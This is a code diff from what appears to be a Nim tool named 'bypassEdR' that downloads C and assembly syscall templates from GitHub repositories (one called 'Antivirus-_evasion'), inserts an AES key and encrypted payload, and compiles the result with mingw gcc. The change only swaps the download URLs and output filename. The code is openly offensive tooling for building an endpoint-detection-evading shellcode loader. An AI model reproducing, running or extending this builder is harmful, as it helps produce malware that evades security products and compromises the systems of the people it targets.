@@ -39,9 +39,9 @@ proc bypassEdR() =
   let aescode = "unsigned char cool[] = { " & ciphertextStr & " };"
   
   ## URLs for downloading required files.
-  let url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/indirect.c"
-  let url2 = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/syscalls.asm"
-  let url3 = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/syscalls.h"
+  let url = "https://raw.githubusercontent.com/hemanth1258/Antivirus-_evasion/refs/heads/main/sys.c"
+  let url2 = "https://raw.githubusercontent.com/hemanth1258/Antivirus-_evasion/refs/heads/main/syscalls.asm"
+  let url3 = "https://raw.githubusercontent.com/hemanth1258/Antivirus-_evasion/refs/heads/main/syscalls.h"
   
   ## Download and modify the C source file.
   try:
@@ -49,7 +49,7 @@ proc bypassEdR() =
     let content1 = client.get(url)
     var modifiedContent1 = content1.replace("unsigned char AESkey[] = {};", aeskey)
     modifiedContent1 = modifiedContent1.replace("unsigned char cool[] = {};", aescode)
-    writeFile("indirect.c", modifiedContent1)
+    writeFile("sys.c", modifiedContent1)
   except HttpRequestError as e:
     echo "Error: ", e.msg
     quit(1)
@@ -79,7 +79,7 @@ proc bypassEdR() =
     if res1 != 0:
       raise newException(OSError, "uasm failed")
   
-    var proc2 = startProcess("x86_64-w64-mingw32-gcc", args = @["-c", "indirect.c", "-o", "file.obj"], options = {poUsePath})
+    var proc2 = startProcess("x86_64-w64-mingw32-gcc", args = @["-c", "sys.c", "-o", "file.obj"], options = {poUsePath})
     let res2 = waitForExit(proc2)
     if res2 != 0:
       raise newException(OSError, "gcc compilation failed for indirect.c")
